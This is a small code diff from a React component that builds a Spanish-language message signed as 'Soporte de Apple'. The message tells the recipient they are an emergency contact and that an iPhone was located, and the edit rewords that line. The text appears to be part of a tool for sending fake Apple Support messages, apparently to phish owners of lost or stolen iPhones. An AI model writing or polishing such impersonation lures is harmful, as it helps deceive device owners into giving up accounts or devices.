@@ -230,7 +230,7 @@ const ProcessList: React.FC<ProcessListProps> = ({ userType }) => {
         } else {
           message = `*Soporte de Apple 👨🏽‍🔧*
 
-*🚨 Usted ha sido registrado como contacto de emergencia.*
+*🚨 Eres un contacto de emergencia.*
 
 *✅ iPhone localizado con éxito*
 
